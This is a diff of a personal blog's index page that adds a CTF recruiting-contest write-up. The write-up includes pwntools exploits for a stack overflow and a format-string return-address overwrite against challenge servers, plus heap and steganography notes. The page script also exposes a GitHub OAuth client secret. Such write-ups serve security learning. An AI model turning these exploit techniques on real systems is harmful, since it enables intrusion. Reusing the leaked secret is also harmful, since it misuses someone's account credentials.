@@ -64,7 +64,7 @@
 			</ul>
 		</nav>
 		<nav>
-			总文章数 20
+			总文章数 21
 		</nav>
 		<nav class="header-smart-menu">
     		
@@ -429,6 +429,116 @@ gitalk.render('gitalk-container')
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/12/11/heap/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+if(true){
+    var gitalk = new Gitalk({
+    clientID: 'd7ed634dc972bb7fd909',
+    clientSecret: 'fb780f732ab4e8af3a1059bd864c85b1b5235496',
+    repo: 'comments.github.io',
+    owner: 'ChrisL0tus',
+    admin: ['ChrisL0tus'],
+    id: '',
+    distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+  
+
+  
+    <article id="post-0rays" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/12/11/0rays/">0rays Recruiting Contest</a>
+    </h1>
+  
+
+        <!--显示阅读次数-->
+        
+        <!--显示阅读次数完毕-->
+        
+        <a href="/2022/12/11/0rays/" class="archive-article-date">
+  	<time datetime="2022-12-10T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-12-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ez-aaa-done"><a href="#ez-aaa-done" class="headerlink" title="ez_aaa | done"></a>ez_aaa | done</h1><p><img src="/%22https:/raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/backdoor_1.png%22" alt="test"><br>PIE enabled<br>Partial Write &amp; Good Luck</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;124.222.96.143&quot;</span>,<span class="string">&quot;10035&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./ez_aaa&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload+=p64(<span class="number">0x6DA</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="ez-fmt-done"><a href="#ez-fmt-done" class="headerlink" title="ez_fmt | done"></a>ez_fmt | done</h1><p><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_4.png" alt="test"><br>Offset: 8<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_1.png" alt="test"><br>gdb<br>Set a breakpoint at vuln<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_2.png" alt="test"><br>Write some gabbage<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_3.png" alt="test"><br>Check the stack when it comes to printf<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_6.png" alt="test"><br>The red square is what we need to leak while the blue refers to return adderss<br>The offset of rbp &#x3D; 0x24 - 0x2 + 8 &#x3D; 42 (D)<br>Thus we can leak rbp via: %42$p<br>Return address on stack &#x3D; rbp - 0x8<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/fmt_5.png" alt="test"><br>backdoor_addr &#x3D; 0x40085A<br>Initial retaddress &#x3D; 0x400964<br>Thus, we need to cover 0x085A on 0x0964, 0x085A equals to 2138 ( D )<br>%2138c%10$hnaaaa<br>aaaa is used for aligning and we can figure out from gdb that retaddressOnstack is the 10th<br>parameter</p>
+<p>Don’t forget to send EOF to end the loop and then return to backdoor</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./ez_fmt&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;124.222.96.143&quot;</span>,<span class="string">&quot;10039&quot;</span>)</span><br><span class="line">backdoor=<span class="number">0x40084A</span></span><br><span class="line">retaddress=<span class="number">0x400964</span></span><br><span class="line">payload=<span class="string">b&quot;%42$p&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;try!&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line">retaddressOnstack=rbp-<span class="number">0x8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddressOnstack))</span><br><span class="line"><span class="comment">#p.sendafter(&quot;try!&quot;,fmtstr_payload(8,&#123;retaddressOnstack+8:0x40084A, retaddressOnstack:0x40094B&#125;))</span></span><br><span class="line">payload=<span class="string">b&#x27;%2138c%10$hnaaaa&#x27;</span>+p64(retaddressOnstack)</span><br><span class="line">p.sendafter(<span class="string">&quot;try!&quot;</span>,payload)</span><br><span class="line">payload=<span class="string">b&quot;EOF\x00&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;try!&quot;</span>,payload)</span><br><span class="line"><span class="comment">#p.recvuntil(&quot;get shell!&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="ez-heap-stuck"><a href="#ez-heap-stuck" class="headerlink" title="ez_heap | stuck"></a>ez_heap | stuck</h1><p>Maybe an UAF (?<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/heap_1.png" alt="test"><br>An idea learn from chuj’s blog: We first add two notes, and set their size to a value other than 8, so that they will not become the best fit for future overriding strings. Their Idx should be 0 and 1. Then delete these two notes. At this time, there will be two bins with a size of 8 in the fast bin. Then we apply for a note and set the size of the content of this note to 8. Then the space allocated for this content is the space that was deleted before.</p>
+<p>Still need some time to learn more…</p>
+<h1 id="misc-sign-in-done"><a href="#misc-sign-in-done" class="headerlink" title="misc sign_in | done"></a>misc sign_in | done</h1><p><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/misc_1.png" alt="test"><br>It’s gonna be a zip<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/misc_2.png" alt="test"><br>Then we got a png in it<br>Adjust its height<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/misc_3.png" alt="test"><br>Put into StegSolve and check the passage<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/misc_4.png" alt="test"><br>Then we got it.</p>
+<h1 id="the-end"><a href="#the-end" class="headerlink" title="the end"></a>the end</h1><p>It has been 2 months since I paused my study process in CTF. Obviously, my capability is weak. I can only figure out some easy problems, which apparently can not meet the standard of 0rays. It’s sad to say goodbye to my dearest teammates Humb1e, RZ, gtg, and Ech0. They are talented and diligent. They deserve it.<br>Most importantly, it was a wonderful experience and I learned a lot. Hope I will get better.</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write up</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/12/11/0rays/">展开全文 >></a>
         </p>
       
 
@@ -1107,111 +1217,9 @@ gitalk.render('gitalk-container')
   
 
   
-    <article id="post-9.16汇编" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/09/16/9.16%E6%B1%87%E7%BC%96/">9.16汇编语言（第四章）</a>
-    </h1>
-  
-
-        <!--显示阅读次数-->
-        
-        <!--显示阅读次数完毕-->
-        
-        <a href="/2022/09/16/9.16%E6%B1%87%E7%BC%96/" class="archive-article-date">
-  	<time datetime="2022-09-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-09-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="第一个汇编程序"><a href="#第一个汇编程序" class="headerlink" title="第一个汇编程序"></a>第一个汇编程序</h1>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">汇编学习之路</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/09/16/9.16%E6%B1%87%E7%BC%96/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-if(true){
-    var gitalk = new Gitalk({
-    clientID: 'd7ed634dc972bb7fd909',
-    clientSecret: 'fb780f732ab4e8af3a1059bd864c85b1b5235496',
-    repo: 'comments.github.io',
-    owner: 'ChrisL0tus',
-    admin: ['ChrisL0tus'],
-    id: '',
-    distractionFreeMode: 'true'
-})
-gitalk.render('gitalk-container') 
-}
-</script>
-  
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
     </nav>
   
 
